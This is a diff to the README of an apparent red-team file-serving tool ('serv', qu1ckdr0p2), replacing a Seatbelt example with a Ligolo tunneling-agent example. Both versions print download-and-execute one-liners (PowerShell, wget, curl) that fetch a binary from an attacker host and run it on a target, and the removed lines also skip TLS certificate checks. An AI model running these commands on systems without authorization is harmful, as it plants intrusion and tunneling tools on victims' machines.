@@ -102,48 +102,51 @@ serv init --update-self
 ### Serv a file from a mapped alias
 The mapped alias numbers for the `-u` option are dynamic so you don't have to remember specific numbers or ever type out a tool name.
 ```zsh
-$ serv serve --search seatbelt
-[→] Path: ~/.qu1ckdr0p2/windows/Seatbelt.exe
-[→] Alias: seatbelt
+$ serv serve --search ligolo               
+
+[→] Path: ~/.qu1ckdr0p2/windows/agent.exe
+[→] Alias: ligolo_agent_win
 [→] Use: 1
 
-[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
-[→] Alias: seatbelt_net40_any
+[→] Path: ~/.qu1ckdr0p2/windows/proxy.exe
+[→] Alias: ligolo_proxy_win
 [→] Use: 2
 
-[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x64/Seatbelt.exe
-[→] Alias: seatbelt_net40_x64
+[→] Path: ~/.qu1ckdr0p2/linux/agent
+[→] Alias: ligolo_agent_linux
 [→] Use: 3
 
-[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x86/Seatbelt.exe
-[→] Alias: seatbelt_net40_x86
+[→] Path: ~/.qu1ckdr0p2/linux/proxy
+[→] Alias: ligolo_proxy_linux
 [→] Use: 4
-
 (...)
+```
+```zsh
+$ serv serve --search ligolo -u 3 --http 80
 
-$ serv serve --search seatbelt -u 2
-[→] Serving: ../../../.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
-[→] Protocol: https
+[→] Serving: ../../.qu1ckdr0p2/linux/agent
+[→] Protocol: http
 [→] IP address: 192.168.1.5
-[→] Port: 443
+[→] Port: 80
 [→] Interface: eth0
-[→] Using cert: /home/byinarie/.qu1ckdr0p2/certs/cert.pem
-[→] Using key: /home/byinarie/.qu1ckdr0p2/certs/key.pem
 [→] CTRL+C to quit
 
-[→] URL: https://192.168.1.5:443/Seatbelt.exe
+[→] URL: http://192.168.1.5:80/agent
 
-[↓] csharp_ignore_tls:
-Add-Type -TypeDefinition "using System.Net;using System.Security.Cryptography.X509Certificates;public class SSLValidator {public static void Ignore() {ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;}}" -Language CSharp; [SSLValidator]::Ignore(); $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe');Start-Process 'c:\windows\temp\Seatbelt.exe'
+[↓] csharp:
+$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('http://192.168.1.5:80/agent', 'c:\windows\temp\agent'); Start-Process 'c:\windows\temp\agent'
 
-[↓] wget_ignore_tls:
-wget --no-check-certificate https://192.168.1.5:443/Seatbelt.exe -O /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe
+[↓] wget:
+wget http://192.168.1.5:80/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent
 
-[↓] curl_ignore_tls:
-curl -k https://192.168.1.5:443/Seatbelt.exe -o /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe
+[↓] curl:
+curl http://192.168.1.5:80/agent -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent
 
-[↓] powershell_ignore_tls:
-$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe'); Start-Process 'c:\windows\temp\Seatbelt.exe'
+[↓] powershell:
+Invoke-WebRequest -Uri http://192.168.1.5:80/agent -OutFile c:\windows\temp\agent; Start-Process c:\windows\temp\agent
+
+⠧ Web server running
+
 ```
 
 
